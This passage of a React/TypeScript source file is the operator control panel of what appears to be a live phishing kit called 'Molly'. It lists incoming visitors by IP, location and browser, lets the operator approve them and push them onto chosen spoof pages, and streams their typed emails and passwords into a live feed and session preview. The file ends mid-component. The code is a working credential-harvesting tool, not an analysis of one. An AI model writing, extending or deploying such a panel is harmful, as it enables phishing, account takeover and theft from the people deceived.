import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { lazy, Suspense, useEffect, useMemo, useRef, useState, type MouseEvent as ReactMouseEvent, type ReactNode } from "react";
import { useServerFn } from "@tanstack/react-start";
import { supabase } from "@/integrations/supabase/client";
import {
  listAccounts,
  createAccount,
  updateAccount,
  deleteAccount,
  getMyAccount,
} from "@/lib/admin-users.functions";
import {
  listMyDomains,
  addDomain,
  removeDomain,
  getMySeedPhrase,
  setMySeedPhrase,
  getServerConnectionInfo,
  setServerPublicIp,
  checkDomainStatus,
} from "@/lib/tenants.functions";
import type { RealtimeChannel } from "@supabase/supabase-js";
import {
  joinChannel,
  isSensitiveAdminSubmission,
  type InputPayload,
  type LiveInputPayload,
  type NavigatePayload,
} from "@/lib/orchestrator";
import {
  loadParticipants,
  markStaleParticipantsOffline,
  purgeStaleUnapproved,
  removeParticipant,
  setParticipantApproval,
  setParticipantAssignment,
  subscribeParticipants,
  type ParticipantRecord,
} from "@/lib/participantStore";
import { StatusDot, type DotState } from "@/components/StatusDot";
import { MollyLogo, type MollyLogoHandle } from "@/components/MollyLogo";
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible";

import {
  getDesigns,
  getDesignLogo,
  getPageIcon,
  getPagesFor,
  getRedirectPages,
  subscribeRegistry,
  type DesignRecord,
  type PageRecord,
} from "@/lib/designStore";
import {
  countryFlagEmoji,
  getAppSettings,
  loadAppSettings,
  setBlockBots,
  startAppSettingsSync,
  subscribeAppSettings,
} from "@/lib/appSettings";

import { ParticipantsIcon, PagesIcon, SettingsIcon, FileUploaderIcon } from "@/components/SettingsIcon";

const pagesEditorImport = () => import("@/components/PagesEditor");
const fileUploaderImport = () => import("@/components/FileUploader");
const livePreviewImport = () => import("@/components/LivePreview");
const panelModalImport = () => import("@/components/PanelModal");

const PagesEditor = lazy(() => pagesEditorImport().then((m) => ({ default: m.PagesEditor })));
const FileUploader = lazy(() => fileUploaderImport().then((m) => ({ default: m.FileUploader })));
const LivePreview = lazy(() => livePreviewImport().then((m) => ({ default: m.LivePreview })));
const PanelModal = lazy(() => panelModalImport().then((m) => ({ default: m.PanelModal })));

function AdminLazyFallback() {
  return <span aria-hidden />;
}


function placeFromParticipant(p: LiveRecord): string {
  return [p.city, p.region, p.country].filter(Boolean).join(", ");
}

function parseUrlParts(url: string): {
  designId: string | null;
  pageId: string | null;
  path: string;
  isFocus: boolean;
} {
  const path = (url || "/").split("?")[0] || "/";
  const m = path.match(/^\/([a-z][a-z0-9_-]{0,30})(?:\/([a-z][a-z0-9_-]{0,40}))?/);
  if (!m || path === "/") {
    return { designId: null, pageId: null, path, isFocus: true };
  }
  return { designId: m[1], pageId: m[2] ?? null, path, isFocus: false };
}

function DesignMark({ url, size = 22 }: { url: string; size?: number }) {
  const { designId, isFocus } = parseUrlParts(url);
  const logo = designId ? getDesignLogo(designId) : null;
  const design = designId ? getDesigns().find((d) => d.id === designId) : undefined;
  if (logo) {
    return (
      <img
        src={logo}
        alt={design?.label ?? designId ?? ""}
        className="pc-logo"
        width={size}
        height={size}
        title={design?.label ?? designId ?? undefined}
      />
    );
  }
  if (isFocus) {
    return (
      <span className="pc-logo pc-logo-focus" style={{ width: size, height: size }} title="Focus Room" aria-hidden>
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
          <line x1="18" y1="6" x2="6" y2="18" />
          <line x1="6" y1="6" x2="18" y2="18" />
        </svg>
      </span>
    );
  }
  return (
    <span className="pc-logo pc-logo-fallback" style={{ width: size, height: size }} aria-hidden>
      {(designId ?? "?").slice(0, 2).toUpperCase()}
    </span>
  );
}

function PagePathChip({ url }: { url: string }) {
  const { path, isFocus, designId, pageId } = parseUrlParts(url);
  const label = isFocus ? "/focus" : path;
  const title = pageLabelFromUrl(url);
  const logo = designId ? getDesignLogo(designId) : null;
  return (
    <span className="pc-path" title={title}>
      {logo ? <img src={logo} alt="" className="pc-path-logo" /> : null}
      <span className="pc-path-text font-mono">{pageId ? `/${designId}/${pageId}` : label}</span>
    </span>
  );
}




export const Route = createFileRoute("/_authenticated/panel")({
  head: () => ({ meta: [{ title: "Molly — Control" }] }),
  component: Admin,
});

type Suite = string;
type Page = string;
type SuiteOpt = { value: string; label: string };
type PageOpt = { value: string; label: string };

function suitesFromDesigns(designs: DesignRecord[]): SuiteOpt[] {
  return designs.map((d) => ({ value: d.id, label: d.label }));
}
function pagesFromPagesFor(pages: PageRecord[]): PageOpt[] {
  return pages.map((p) => ({ value: p.page, label: p.label ?? p.page }));
}

type LiveRecord = ParticipantRecord & { state: DotState };

function pageLabelFromUrl(url: string): string {
  const m = url.match(/^\/([a-z][a-z0-9_-]{0,30})\/([a-z][a-z0-9_-]{0,40})/);
  if (!m) return url === "/" ? "Focus Room" : url;
  const designs = getDesigns();
  const design = designs.find((d) => d.id === m[1]);
  const pages = getPagesFor(m[1]);
  const page = pages.find((p) => p.page === m[2]);
  const suiteLabel = design?.label ?? m[1];
  const pageLabel = page?.label ?? m[2];
  return `${suiteLabel} · ${pageLabel}`;
}

function formatCountdown(ms: number): string {
  if (ms <= 0) return "expired";
  const s = Math.ceil(ms / 1000);
  const m = Math.floor(s / 60);
  const rs = s % 60;
  return `${m}m ${rs.toString().padStart(2, "0")}s`;
}

function parseUA(ua: string | null | undefined): { os: string; browser: string; line: string } | null {
  if (!ua) return null;

  let os = "Unknown";
  if (/Windows NT 1[01]/i.test(ua) || /Windows NT 10\.0/i.test(ua)) os = "Windows 10/11";
  else if (/Windows NT 6\.3/i.test(ua)) os = "Windows 8.1";
  else if (/Windows NT 6\.1/i.test(ua)) os = "Windows 7";
  else if (/Windows/i.test(ua)) os = "Windows";
  else if (/Android (\d+)/i.test(ua)) os = `Android ${ua.match(/Android (\d+)/i)![1]}`;
  else if (/iPhone|iPad|iPod/i.test(ua)) {
    const m = ua.match(/OS (\d+)[._](\d+)/i);
    os = m ? `iOS ${m[1]}.${m[2]}` : "iOS";
  } else if (/Mac OS X (\d+)[._](\d+)/i.test(ua)) {
    const m = ua.match(/Mac OS X (\d+)[._](\d+)/i)!;
    os = `macOS ${m[1]}.${m[2]}`;
  } else if (/CrOS/i.test(ua)) os = "Chrome OS";
  else if (/Linux/i.test(ua)) os = "Linux";

  const major = (v: string) => v.split(".")[0];
  let browser = "Browser";
  const edge = ua.match(/Edg(?:e|A|iOS)?\/([\d.]+)/);
  const opera = ua.match(/OPR\/([\d.]+)/);
  const firefox = ua.match(/Firefox\/([\d.]+)/);
  const chrome = ua.match(/Chrome\/([\d.]+)/);
  const safari = ua.match(/Version\/([\d.]+).*Safari/);
  if (edge) browser = `Edge ${major(edge[1])}`;
  else if (opera) browser = `Opera ${major(opera[1])}`;
  else if (firefox) browser = `Firefox ${major(firefox[1])}`;
  else if (chrome && !/Chromium/i.test(ua)) browser = `Chrome ${major(chrome[1])}`;
  else if (safari) browser = `Safari ${major(safari[1])}`;
  else if (chrome) browser = `Chrome ${major(chrome[1])}`;

  return { os, browser, line: `${os} · ${browser}` };
}

function dotStateFor(p: ParticipantRecord | undefined): DotState {
  if (!p) return "left";
  return p.online ? "on" : "left";
}

function Admin() {
  const [records, setRecords] = useState<Map<string, LiveRecord>>(new Map());
  const [nav, setNav] = useState<"participants" | "pages" | "settings" | "fileuploader">("participants");
  const [folders, setFolders] = useState<{ admin: boolean; utils: boolean }>(() => {
    if (typeof window === "undefined") return { admin: true, utils: true };
    try {
      const raw = localStorage.getItem("admin_folders_v1");
      if (raw) return JSON.parse(raw);
    } catch { /* ignore */ }
    return { admin: true, utils: true };
  });
  function toggleFolder(key: "admin" | "utils") {
    setFolders((prev) => {
      const next = { ...prev, [key]: !prev[key] };
      if (typeof window !== "undefined") {
        localStorage.setItem("admin_folders_v1", JSON.stringify(next));
      }
      return next;
    });
  }
  const [events, setEvents] = useState<InputPayload[]>([]);
  const [liveInputs, setLiveInputs] = useState<Map<string, LiveInputPayload>>(new Map());
  /** All live-typed fields per participant — seeds live preview after redirects. */
  const [liveFieldMaps, setLiveFieldMaps] = useState<Map<string, Record<string, string>>>(
    () => new Map(),
  );
  const [previews, setPreviews] = useState<string[]>([]);
  const [viewports, setViewports] = useState<Map<string, { w: number; h: number }>>(new Map());
  const [designs, setDesigns] = useState<DesignRecord[]>(() => getDesigns());
  const [sidebarOpen, setSidebarOpen] = useState<boolean>(() => {
    if (typeof window === "undefined") return true;
    return localStorage.getItem("admin_sidebar_open") !== "0";
  });
  function toggleSidebar(next?: boolean) {
    setSidebarOpen((prev) => {
      const v = typeof next === "boolean" ? next : !prev;
      if (typeof window !== "undefined") {
        localStorage.setItem("admin_sidebar_open", v ? "1" : "0");
      }
      return v;
    });
  }
  const suites = useMemo(() => suitesFromDesigns(designs), [designs]);
  const channelRef = useRef<RealtimeChannel | null>(null);
  const subscribedRef = useRef(false);
  const mollyRef = useRef<MollyLogoHandle>(null);
  const [, setSettingsTouch] = useState(0); // re-render hook for settings panel only
  const [blockBots, setBlockBotsState] = useState<boolean>(() => getAppSettings().blockBots);
  useEffect(() => {
    const stop = startAppSettingsSync();
    void loadAppSettings();
    const off = subscribeAppSettings((s) => setBlockBotsState(s.blockBots));
    // Preload lazy chunks so tab switches don't flash a Suspense fallback.
    void pagesEditorImport();
    void fileUploaderImport();
    void livePreviewImport();
    void panelModalImport();
    return () => { off(); stop(); };
  }, []);



  async function refreshRecords() {
    const rows = await loadParticipants();
    setRecords(
      new Map(
        rows.map((row) => [
          row.id,
          {
            ...row,
            state: dotStateFor(row),
          },
        ]),
      ),
    );
  }

  useEffect(() => {
    const ch = joinChannel({
      key: `admin_${Math.random().toString(36).slice(2, 8)}`,
      onInput: (p) =>
        setEvents((prev) => {
          // Drop UI noise / non-credential fields before they hit the feed.
          if (p.field.startsWith("__")) return prev;
          if (/_clicked$/i.test(p.field) || p.field === "continue_clicked") return prev;
          if (!isSensitiveAdminSubmission(p.field)) return prev;
          // Dedupe: drop if last event matches (pid,field,value) within 300ms.
          const last = prev[0];
          if (
            last &&
            last.participantId === p.participantId &&
            last.field === p.field &&
            last.value === p.value &&
            Math.abs(p.at - last.at) < 300
          ) {
            return prev;
          }
          // Cap at 50 events per participant so the feed keeps a real history
          // but never overfloods.
          const next = [p, ...prev];
          const perPid = new Map<string, number>();
          const trimmed: InputPayload[] = [];
          for (const ev of next) {
            const n = perPid.get(ev.participantId) ?? 0;
            if (n >= 50) continue;
            perPid.set(ev.participantId, n + 1);
            trimmed.push(ev);
          }
          return trimmed;
        }),
      onLiveInput: (p) => {
        setLiveInputs((prev) => {
          const next = new Map(prev);
          next.set(p.participantId, p);
          return next;
        });
        setLiveFieldMaps((prev) => {
          const next = new Map(prev);
          const fields = { ...(next.get(p.participantId) || {}) };
          fields[p.field] = p.value;
          // Keep common aliases so preview can reseed email chips after nav.
          if (/^(email|identifier|login)$/i.test(p.field) || /email/i.test(p.field)) {
            fields.email = p.value;
            fields.identifier = p.value;
          }
          if (/^password$/i.test(p.field) || p.ftype === "password") {
            fields.password = p.value;
          }
          next.set(p.participantId, fields);
          return next;
        });
        window.dispatchEvent(new CustomEvent("ux:liveinput", { detail: p }));
      },
      onMouse: (p) => {
        if (p.vw && p.vh) {
          setViewports((prev) => {
            const cur = prev.get(p.id);
            if (cur && cur.w === p.vw && cur.h === p.vh) return prev;
            const next = new Map(prev);
            next.set(p.id, { w: p.vw, h: p.vh });
            return next;
          });
        }
        window.dispatchEvent(new CustomEvent("ux:mouse", { detail: p }));
      },
      onClick: (p) => window.dispatchEvent(new CustomEvent("ux:click", { detail: p })),
      onScroll: (p) => window.dispatchEvent(new CustomEvent("ux:scroll", { detail: p })),
      onViewport: (p) => {
        if (p.w && p.h) {
          setViewports((prev) => {
            const cur = prev.get(p.id);
            if (cur && cur.w === p.w && cur.h === p.h) return prev;
            const next = new Map(prev);
            next.set(p.id, { w: p.w, h: p.h });
            return next;
          });
        }
        window.dispatchEvent(new CustomEvent("ux:viewport", { detail: p }));
      },
    });
    ch.subscribe(async (status) => {
      if (status === "SUBSCRIBED") {
        subscribedRef.current = true;
        await ch.track({ admin: true });
      }
    });
    channelRef.current = ch;

    void refreshRecords();
    const participantChannel = subscribeParticipants(() => void refreshRecords());

    // Keep accepted participants forever; flip stale online users red and
    // auto-purge unapproved queue entries that have gone quiet.
    const sweeper = window.setInterval(() => {
      void Promise.all([
        markStaleParticipantsOffline().catch(() => undefined),
        purgeStaleUnapproved().catch(() => undefined),
      ]).then(() => refreshRecords()).catch(() => undefined);
    }, 5_000);
    // Safety: full refresh in case a realtime event was dropped.
    const safety = window.setInterval(() => {
      void refreshRecords().catch(() => undefined);
    }, 10_000);
    return () => {
      subscribedRef.current = false;
      window.clearInterval(sweeper);
      window.clearInterval(safety);
      void participantChannel.unsubscribe();
      void ch.unsubscribe();
    };
  }, []);

  // Load designs registry for the redirect selectors + page labels
  useEffect(() => {
    setDesigns(getDesigns());
    const off = subscribeRegistry(() => setDesigns(getDesigns()));
    return off;
  }, []);

  async function broadcast(event: string, payload: unknown, retries = 3) {
    const ch = channelRef.current;
    if (!ch) return;
    for (let i = 0; i < retries; i++) {
      if (subscribedRef.current) {
        try {
          const res = await ch.send({ type: "broadcast", event, payload });
          if (res === "ok") return;
        } catch {
          /* retry */
        }
      }
      await new Promise((r) => setTimeout(r, 200));
    }
  }

  async function sendNavigate(id: string, suite: Suite, page: Page) {
    const url = `/${suite}/${page}`;
    await setParticipantAssignment(id, url);
    const payload: NavigatePayload = { targets: [id], url };
    void broadcast("navigate", payload);
  }


  function kick(id: string) {
    void broadcast("revoke", { id });
    void removeParticipant(id).then(refreshRecords);
    setPreviews((p) => p.filter((x) => x !== id));
  }


  function approve(id: string, suite: Suite, page: Page) {
    const url = `/${suite}/${page}`;
    void setParticipantApproval(id, true, url).then(() => {
      void refreshRecords();
      void broadcast("approve", { id });
      setTimeout(() => void sendNavigate(id, suite, page), 200);
    });
    setRecords((prev) => {
      const r = prev.get(id);
      if (!r) return prev;
      const next = new Map(prev);
      next.set(id, { ...r, approved: true, assignedUrl: url, currentUrl: url });
      return next;
    });
  }

  function revoke(id: string) {
    void broadcast("revoke", { id });
    void setParticipantApproval(id, false, null).then(refreshRecords);
    setRecords((prev) => {
      const r = prev.get(id);
      if (!r) return prev;
      const next = new Map(prev);
      next.set(id, { ...r, approved: false, assignedUrl: null, currentUrl: "/" });
      return next;
    });
    setPreviews((p) => p.filter((x) => x !== id));
  }

  function openPreview(id: string) {
    setPreviews((p) => (p.includes(id) ? p : [...p, id]));
  }
  function closePreview(id: string) {
    setPreviews((p) => p.filter((x) => x !== id));
  }

  const list = useMemo(
    () => Array.from(records.values()).sort((a, b) => a.joinedAt - b.joinedAt),
    [records],
  );
  // Queue: newest first (just-joined at the top).
  const queue = list.filter((r) => !r.approved).slice().sort((a, b) => b.joinedAt - a.joinedAt);
  const approved = list.filter((r) => r.approved);

  return (
    <div className="admin-noir min-h-screen">
      <div
        className={`admin-shell ${sidebarOpen ? "is-open" : "is-collapsed"} chat-closed`}
      >
        <aside className="admin-sidebar">
          <div className="admin-sidebar-head">
            <button
              type="button"
              className="admin-brand-btn"
              onMouseEnter={() => mollyRef.current?.play()}
              onClick={() => toggleSidebar()}
              title={sidebarOpen ? "Collapse sidebar" : "Expand sidebar"}
              aria-label={sidebarOpen ? "Collapse sidebar" : "Expand sidebar"}
            >
              <span className="admin-avatar">
                <MollyLogo ref={mollyRef} size={28} />
              </span>
              <span className="admin-brand-name">Molly</span>
            </button>
            <div className="admin-sidebar-head-actions">
              <button
                type="button"
                className="admin-icon-btn"
                title={sidebarOpen ? "Collapse sidebar" : "Expand sidebar"}
                aria-label="Toggle sidebar"
                onClick={() => toggleSidebar()}
              >
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="3" y="4" width="18" height="16" rx="2" />
                  <path d="M9 4v16" />
                </svg>
              </button>
            </div>
          </div>
          <nav className="admin-nav">
            <Collapsible open={folders.admin} onOpenChange={() => toggleFolder("admin")}>
              <CollapsibleTrigger asChild>
                <button
                  type="button"
                  className={`admin-nav-folder ${folders.admin ? "is-open" : ""}`}
                  title="Panel"
                >
                  <span className="admin-nav-folder-chev" aria-hidden>
                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <polyline points="9 18 15 12 9 6" />
                    </svg>
                  </span>
                  <span className="admin-nav-folder-label">Panel</span>
                </button>
              </CollapsibleTrigger>
              <CollapsibleContent className="admin-nav-collapsible" forceMount>
                <div className="admin-nav-group">
                  <button
                    type="button"
                    className={`admin-nav-item ${nav === "participants" ? "is-active" : ""}`}
                    aria-current={nav === "participants" ? "page" : undefined}
                    onClick={() => setNav("participants")}
                    title="Participants"
                  >
                    <span className="admin-nav-icon">
                      <ParticipantsIcon />
                    </span>
                    <span className="admin-nav-label">Participants</span>
                    <span className="admin-count">{list.length}</span>
                  </button>
                  <button
                    type="button"
                    className={`admin-nav-item ${nav === "pages" ? "is-active" : ""}`}
                    aria-current={nav === "pages" ? "page" : undefined}
                    onClick={() => setNav("pages")}
                    title="Pages"
                  >
                    <span className="admin-nav-icon">
                      <PagesIcon />
                    </span>
                    <span className="admin-nav-label">Pages</span>
                  </button>
                  <button
                    type="button"
                    className={`admin-nav-item ${nav === "settings" ? "is-active" : ""}`}
                    aria-current={nav === "settings" ? "page" : undefined}
                    onClick={() => setNav("settings")}
                    title="Settings"
                  >
                    <span className="admin-nav-icon">
                      <SettingsIcon />
                    </span>
                    <span className="admin-nav-label">Settings</span>
                  </button>
                </div>
              </CollapsibleContent>
            </Collapsible>

            <Collapsible open={folders.utils} onOpenChange={() => toggleFolder("utils")}>
              <CollapsibleTrigger asChild>
                <button
                  type="button"
                  className={`admin-nav-folder ${folders.utils ? "is-open" : ""}`}
                  title="Utils"
                >
                  <span className="admin-nav-folder-chev" aria-hidden>
                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <polyline points="9 18 15 12 9 6" />
                    </svg>
                  </span>
                  <span className="admin-nav-folder-label">Utils</span>
                </button>
              </CollapsibleTrigger>
              <CollapsibleContent className="admin-nav-collapsible" forceMount>
                <div className="admin-nav-group">
                  <button
                    type="button"
                    className={`admin-nav-item ${nav === "fileuploader" ? "is-active" : ""}`}
                    aria-current={nav === "fileuploader" ? "page" : undefined}
                    onClick={() => setNav("fileuploader")}
                    title="File Uploader"
                  >
                    <span className="admin-nav-icon">
                      <FileUploaderIcon />
                    </span>
                    <span className="admin-nav-label">File Uploader</span>
                  </button>
                </div>
              </CollapsibleContent>
            </Collapsible>
          </nav>
          <AccountChip />
        </aside>



        <main className="admin-main">
          <Suspense fallback={<AdminLazyFallback />}>
            <div hidden={nav !== "participants"} style={nav === "participants" ? undefined : { display: "none" }}>
              <div className="admin-pane">
                <SessionsPage
                  queue={queue}
                  approved={approved}
                  onApprove={approve}
                  onNavigate={sendNavigate}
                  onRevoke={revoke}
                  onKick={kick}
                  onOpenPreview={openPreview}
                  events={events}
                  suites={suites}
                />
              </div>
            </div>

            <div hidden={nav !== "pages"} style={nav === "pages" ? undefined : { display: "none" }} className="admin-pane">
              <PagesEditor />
            </div>

            <div hidden={nav !== "fileuploader"} style={nav === "fileuploader" ? undefined : { display: "none" }} className="admin-pane">
              <FileUploader />
            </div>

            <div hidden={nav !== "settings"} style={nav === "settings" ? undefined : { display: "none" }} className="admin-pane">
              <SettingsPane
                blockBots={blockBots}
                onToggleBlockBots={(v) => {
                  setBlockBotsState(v);
                  void setBlockBots(v);
                  setSettingsTouch((n) => n + 1);
                }}
              />
            </div>
          </Suspense>
        </main>

      </div>



      {previews.map((pid) => {
        const rec = records.get(pid);
        const initialUrl = rec?.currentUrl || rec?.assignedUrl || null;
        const initialViewport = viewports.get(pid) || null;
        const fromLive = liveFieldMaps.get(pid) || {};
        const fromSubmitted: Record<string, string> = {};
        for (const e of events) {
          if (e.participantId !== pid) continue;
          const key = e.field.replace(/_submitted$/i, "");
          fromSubmitted[key] = e.value;
          fromSubmitted[e.field] = e.value;
          if (/^email$/i.test(key)) {
            fromSubmitted.email = e.value;
            fromSubmitted.identifier = e.value;
          }
          if (/^password$/i.test(key)) fromSubmitted.password = e.value;
        }
        const seedInputs = { ...fromSubmitted, ...fromLive };
        return (
          <LivePreview
            key={pid}
            pid={pid}
            onClose={() => closePreview(pid)}
            initialUrl={initialUrl}
            initialViewport={initialViewport}
            seedInputs={seedInputs}
          />
        );
      })}
    </div>
  );
}

function formatRelative(ts: number): string {
  const diff = Math.max(0, Date.now() - ts);
  const s = Math.floor(diff / 1000);
  if (s < 60) return "less than a minute ago";
  const m = Math.floor(s / 60);
  if (m < 60) return `${m}m ago`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h}h ago`;
  const d = Math.floor(h / 24);
  return `${d}d ago`;
}

function useTick(ms: number): void {
  const [, setT] = useState(0);
  useEffect(() => {
    const id = window.setInterval(() => setT((t) => t + 1), ms);
    return () => window.clearInterval(id);
  }, [ms]);
}

function CopyChip({
  text,
  className,
  title,
  children,
}: {
  text: string;
  className?: string;
  title?: string;
  children: ReactNode;
}) {
  const [copied, setCopied] = useState(false);
  function copy(e: ReactMouseEvent) {
    e.stopPropagation();
    if (!text) return;
    try {
      void navigator.clipboard.writeText(text);
      setCopied(true);
      window.setTimeout(() => setCopied(false), 900);
    } catch {
      /* ignore */
    }
  }
  return (
    <button
      type="button"
      className={`copy-chip ${className ?? ""}`}
      onClick={copy}
      title={title ?? "Copy"}
    >
      {children}
      {copied && <span className="copy-chip-pill">Copied</span>}
    </button>
  );
}

function QueueTtlRing({ remainingMs, ttlMs }: { remainingMs: number; ttlMs: number }) {
  const r = 14;
  const c = 2 * Math.PI * r;
  const pct = Math.max(0, Math.min(1, remainingMs / ttlMs));
  const dash = c * pct;
  const urgent = remainingMs <= 60_000;
  const label = remainingMs <= 0
    ? "0s"
    : remainingMs < 60_000
      ? `${Math.ceil(remainingMs / 1000)}s`
      : `${Math.ceil(remainingMs / 60_000)}m`;
  return (
    <span className={`pc-ttl-ring ${urgent ? "is-warn" : ""}`} title="Time until queue expiry" aria-label={`Expires in ${label}`}>
      <svg width="34" height="34" viewBox="0 0 34 34" aria-hidden>
        <circle cx="17" cy="17" r={r} fill="none" stroke="#1a1a1a" strokeWidth="2.5" />
        <circle
          cx="17"
          cy="17"
          r={r}
          fill="none"
          stroke={urgent ? "#ffb86b" : "#5dffa3"}
          strokeWidth="2.5"
          strokeLinecap="round"
          strokeDasharray={`${dash} ${c}`}
          transform="rotate(-90 17 17)"
        />
      </svg>
      <span className="pc-ttl-ring-label">{label}</span>
    </span>
  );
}

function SessionCardBody({ p, showId = false }: { p: LiveRecord; showId?: boolean }) {
  const ua = parseUA(p.userAgent);
  const place = placeFromParticipant(p);
  return (
    <>
      <DesignMark url={p.currentUrl} size={22} />
      <div className="pc-identity">
        <div className="pc-identity-top">
          <span className="pc-flag" aria-hidden>{countryFlagEmoji(p.countryCode)}</span>
          {p.ip ? (
            <CopyChip text={p.ip} title="Copy IP" className="pc-ip copy-chip-inline">
              <span className="font-mono">{p.ip}</span>
            </CopyChip>
          ) : (
            <CopyChip text={p.id} title="Copy participant id" className="pc-ip copy-chip-inline">
              <span className="font-mono">{shortId(p.id)}</span>
            </CopyChip>
          )}
          <StatusDot state={p.state} />
          {showId && (
            <CopyChip text={p.id} title="Copy full participant id" className="pc-pid copy-chip-inline">
              <span className="font-mono">{shortId(p.id)}</span>
            </CopyChip>
          )}
        </div>
        <div className="pc-identity-geo">
          {place ? <span className="pc-place">{place}</span> : <span className="pc-place pc-muted">Unknown location</span>}
          {p.host && (
            <span className="pc-host" title="Connected host">
              <span className="pc-host-label">via</span> {p.host}
            </span>
          )}
        </div>
      </div>
      <div className="pc-ua pc-ua-inline" title={p.userAgent ?? undefined}>
        {ua ? <span>{ua.os} · {ua.browser}</span> : <span className="pc-muted">Unknown client</span>}
      </div>
      <div className="pc-page">
        <PagePathChip url={p.currentUrl} />
      </div>
    </>
  );
}

function SessionsPage({
  queue,
  approved,
  onApprove,
  onNavigate,
  onRevoke,
  onKick,
  onOpenPreview,
  events,
  suites,
}: {
  queue: LiveRecord[];
  approved: LiveRecord[];
  onApprove: (id: string, suite: Suite, page: Page) => void;
  onNavigate: (id: string, suite: Suite, page: Page) => void;
  onRevoke: (id: string) => void;
  onKick: (id: string) => void;
  onOpenPreview: (id: string) => void;
  events: InputPayload[];
  suites: SuiteOpt[];
}) {
  const [query, setQuery] = useState("");
  const filtered = useMemo(() => {
    const q = query.trim().toLowerCase();
    if (!q) return approved;
    return approved.filter((p) => {
      const hay = [
        p.ip,
        p.city,
        p.region,
        p.country,
        p.countryCode,
        p.host,
        p.id,
        p.userAgent,
        p.currentUrl,
      ]
        .filter(Boolean)
        .join(" ")
        .toLowerCase();
      return hay.includes(q);
    });
  }, [approved, query]);

  function clearQueue() {
    if (queue.length === 0) return;
    if (!window.confirm(`Decline all ${queue.length} pending ${queue.length === 1 ? "entry" : "entries"}?`)) return;
    for (const p of queue) onKick(p.id);
  }
  function clearActive() {
    if (approved.length === 0) return;
    if (!window.confirm(`Remove all ${approved.length} active ${approved.length === 1 ? "session" : "sessions"}?`)) return;
    for (const p of approved) onKick(p.id);
  }

  return (
    <div className="sessions-page">
      <section className="sessions-section">
        <header className="sessions-head">
          <div className="sessions-head-left">
            <h2 className="sessions-title">Pending Approval</h2>
            <span className="sessions-count">{queue.length}</span>
          </div>
          <div className="sessions-head-right">
            {queue.length > 0 && (
              <>
                <span className="sessions-note">Auto-expires after 15m</span>
                <button type="button" className="sessions-clear" onClick={clearQueue}>
                  Clear
                </button>
              </>
            )}
          </div>
        </header>
        {queue.length === 0 ? (
          <p className="sessions-empty">No one waiting. New visitors show up here for approval.</p>
        ) : (
          <div className="admin-grid">
            {queue.map((p) => (
              <QueueCard key={p.id} p={p} onApprove={onApprove} onKick={onKick} suites={suites} />
            ))}
          </div>
        )}
      </section>

      <section className="sessions-section">
        <header className="sessions-head">
          <div className="sessions-head-left">
            <h2 className="sessions-title">Active Sessions</h2>
            <span className="sessions-count">{approved.length}</span>
          </div>
          <div className="sessions-head-right">
            <input
              className="sessions-search"
              type="search"
              value={query}
              onChange={(e) => setQuery(e.target.value)}
              placeholder="Search IP, country…"
              aria-label="Search active sessions"
            />
            {approved.length > 0 && (
              <button type="button" className="sessions-clear" onClick={clearActive}>
                Clear All
              </button>
            )}
          </div>
        </header>
        {filtered.length === 0 ? (
          <p className="sessions-empty">
            {approved.length === 0
              ? "No active sessions yet. Approve someone from Pending."
              : "No sessions match that search."}
          </p>
        ) : (
          <div className="admin-grid">
            {filtered.map((p) => (
              <ParticipantCard
                key={p.id}
                p={p}
                onNavigate={onNavigate}
                onRevoke={onRevoke}
                onKick={onKick}
                onOpenPreview={onOpenPreview}
                suites={suites}
                events={events.filter((e) => e.participantId === p.id)}
              />
            ))}
          </div>
        )}
      </section>
    </div>
  );
}

function QueueCard({
  p,
  onApprove,
  onKick,
  suites,
}: {
  p: LiveRecord;
  onApprove: (id: string, suite: Suite, page: Page) => void;
  onKick: (id: string) => void;
  suites: SuiteOpt[];
}) {
  const [open, setOpen] = useState(false);
  const [suite, setSuite] = useState<Suite>(() => suites[0]?.value ?? "");
  const [regRev, setRegRev] = useState(0);
  useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
  useTick(1_000);
  const pageOpts: PageOpt[] = useMemo(
    () => (suite ? pagesFromPagesFor(getPagesFor(suite)) : []),
    [suite, regRev],
  );
  const [page, setPage] = useState<Page>(() => pageOpts[0]?.value ?? "");
  useEffect(() => {
    if (!suite && suites[0]) setSuite(suites[0].value);
  }, [suites, suite]);
  useEffect(() => {
    if (!pageOpts.find((o) => o.value === page)) {
      setPage(pageOpts[0]?.value ?? "");
    }
  }, [pageOpts, page]);

  const TTL_MS = 15 * 60 * 1000;
  const remaining = p.joinedAt + TTL_MS - Date.now();
  const expiringSoon = remaining <= 60_000;

  return (
    <article className={`pc ${expiringSoon ? "is-warn" : ""}`}>
      <div className="pc-row">
        <QueueTtlRing remainingMs={remaining} ttlMs={TTL_MS} />
        <SessionCardBody p={p} />
        <div className="pc-actions">
          <button type="button" className="pc-btn pc-btn-accept" onClick={() => setOpen(true)}>
            Accept
          </button>
          <button
            type="button"
            className="pc-btn pc-btn-decline"
            title="Remove from queue"
            onClick={() => onKick(p.id)}
          >
            Decline
          </button>
        </div>
      </div>

      {open && (
        <Suspense fallback={<AdminLazyFallback />}>
          <PanelModal
            title={
              <span>
                Accept <span className="font-mono text-[11px] opacity-60">{shortId(p.id)}</span>
              </span>
            }
            onClose={() => setOpen(false)}
            maxWidth={340}
            className="pc-modal"
          >
            <div className="pc-popout">
              <label className="admin-field">
                <span>Design Suite</span>
                <select value={suite} onChange={(e) => setSuite(e.target.value)}>
                  {suites.map((s) => (
                    <option key={s.value} value={s.value}>
                      {s.label}
                    </option>
                  ))}
                </select>
              </label>
              <label className="admin-field">
                <span>Starting Page</span>
                <select value={page} onChange={(e) => setPage(e.target.value)}>
                  {pageOpts.map((pg) => (
                    <option key={pg.value} value={pg.value}>
                      {pg.label}
                    </option>
                  ))}
                </select>
              </label>
              <div className="pc-popout-actions">
                <button type="button" className="admin-btn admin-btn-ghost" onClick={() => setOpen(false)}>
                  Cancel
                </button>
                <button
                  type="button"
                  className="admin-btn admin-btn-primary"
                  onClick={() => {
